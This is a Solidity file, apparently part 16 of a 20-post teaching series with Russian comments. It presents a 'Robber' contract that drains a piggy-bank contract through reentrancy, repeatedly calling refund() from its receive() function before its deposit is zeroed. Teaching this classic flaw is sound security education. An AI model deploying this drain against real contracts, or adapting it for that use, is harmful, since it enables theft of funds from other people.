// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IKopilka {
    function deposit() external payable;
    function refund() external;
}

/// Пост 16/20 — грабитель: реентрабельность через refund().
contract Robber {
    IKopilka public target;
    uint256 public bait;

    constructor(address target_) {
        target = IKopilka(target_);
    }

    function attack() external payable {
        bait = msg.value;
        target.deposit{value: bait}(); // вносим приманку
        target.refund();               // и сразу забираем — начинается рекурсия
    }

    // сюда прилетают деньги от refund — и мы бьём снова
    receive() external payable {
        if (address(target).balance >= bait) {
            target.refund(); // наш вклад ещё не обнулён — Копилка отдаёт опять
        }
    }
}
